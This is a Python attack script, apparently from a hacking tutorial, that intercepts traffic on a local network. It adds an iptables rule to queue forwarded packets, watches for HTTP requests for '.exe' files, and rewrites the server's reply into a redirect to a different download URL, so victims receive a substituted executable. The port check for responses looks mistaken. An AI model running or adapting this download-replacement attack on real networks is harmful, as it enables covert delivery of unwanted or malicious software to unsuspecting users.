#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
ack_list =[]

def set_load(packet,my_str):
    packet[scapy.Raw].load = my_str
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    #del scapy_packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet

def quick_start():
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):

        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            #print(scapy_packet.show())
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport != 80:

            print("HTTP Response")
            print(scapy_packet.show())
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] Replcaing file")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://browser.yandex.ru/download?banerid=6302000000&os=win\n\n")
                packet.set_payload(bytes(modified_packet))

    packet.accept()

quick_start()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()